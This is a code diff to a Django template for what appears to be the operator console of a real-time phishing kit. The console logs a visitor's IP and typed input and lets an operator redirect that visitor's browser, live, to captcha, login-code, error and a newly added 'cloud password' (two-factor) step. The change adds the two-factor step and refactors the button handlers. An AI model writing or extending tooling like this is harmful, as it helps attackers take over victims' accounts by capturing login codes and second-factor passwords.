@@ -40,7 +40,8 @@
         <div class="quick-actions">
             <button type="button" class="quick-action" id="redirect-captcha" data-url="{% url 'captcha' %}" data-step="captcha" disabled>На капчу</button>
             <button type="button" class="quick-action" id="redirect-code" data-url="{% url 'code' %}" data-step="code" disabled>На код</button>
-            <button type="button" class="quick-action" id="redirect-error" data-url="{% url 'error' %}" data-step="error" disabled style="display: none">На ошибку</button>
+            <button type="button" class="quick-action" id="redirect-keyword" data-url="{% url 'keyword' %}" data-step="password" disabled>На облачный пароль</button>
+            <button type="button" class="quick-action" id="redirect-error" data-url="{% url 'error' %}" data-step="error" disabled>На ошибку</button>
         </div>
         <p class="hint" id="redirect-hint">Посетитель будет перенаправлен на указанную страницу прямо в браузере.</p>
     </div>
@@ -61,10 +62,7 @@
     const infoIp = document.getElementById('info-ip');
     const infoConnected = document.getElementById('info-connected');
     const infoAction = document.getElementById('info-action');
-    const redirectCaptcha = document.getElementById('redirect-captcha');
-    const redirectCode = document.getElementById('redirect-code');
-    const redirectError = document.getElementById('redirect-error');
-    const redirectButtons = [redirectCaptcha, redirectCode, redirectError];
+    const redirectButtons = document.querySelectorAll('.quick-actions .quick-action');
     const redirectHint = document.getElementById('redirect-hint');
     const inputLog = document.getElementById('input-log');
     const logEmpty = document.getElementById('log-empty');
@@ -166,20 +164,12 @@
         },
     });
 
-    redirectCaptcha.addEventListener('click', () => {
-        if (visitorOnline && visitorWaiting) {
-            sendVisitorRedirect(connection, visitorId, redirectCaptcha.dataset.url, redirectCaptcha.dataset.step);
-        }
-    });
-    redirectCode.addEventListener('click', () => {
-        if (visitorOnline && visitorWaiting) {
-            sendVisitorRedirect(connection, visitorId, redirectCode.dataset.url, redirectCode.dataset.step);
-        }
-    });
-    redirectError.addEventListener('click', () => {
-        if (visitorOnline && visitorWaiting) {
-            sendVisitorRedirect(connection, visitorId, redirectError.dataset.url, redirectError.dataset.step);
-        }
+    redirectButtons.forEach((button) => {
+        button.addEventListener('click', () => {
+            if (visitorOnline && visitorWaiting) {
+                sendVisitorRedirect(connection, visitorId, button.dataset.url, button.dataset.step);
+            }
+        });
     });
 </script>
 {% endblock extra_js %}
